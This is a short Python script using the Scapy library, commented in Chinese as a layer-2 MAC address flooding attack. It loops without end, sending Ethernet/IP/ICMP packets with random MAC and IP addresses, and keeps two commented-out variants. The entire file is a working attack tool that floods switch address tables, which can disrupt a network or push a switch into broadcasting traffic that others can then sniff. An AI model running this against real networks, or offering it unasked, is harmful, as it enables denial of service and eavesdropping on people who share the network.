from scapy.all import  *
import time
# 二层攻击
# MAC地址泛洪攻击
def main():
    while 1:
        packet = Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP(),dst=RandIP())/ICMP()
        time.sleep(0.5)
        sendp(packet)
        print(packet.summary())
    # 或者这样写，直接不配置Ether
    '''
        while 1:
        packet = IP(src=RandIP(), dst=RandIP()) / ICMP()
        time.sleep(0.5)
        sendp(packet)
        print(packet.summary())
    '''
    # 当然也可以只配置Ether
    '''
    while 1:
        packet = Ether(src=RandMAC(),dst=RandMAC())
        time.sleep(0.5)
        sendp(packet)
        print(packet.summary())
    '''
if __name__ == '__main__':
    main()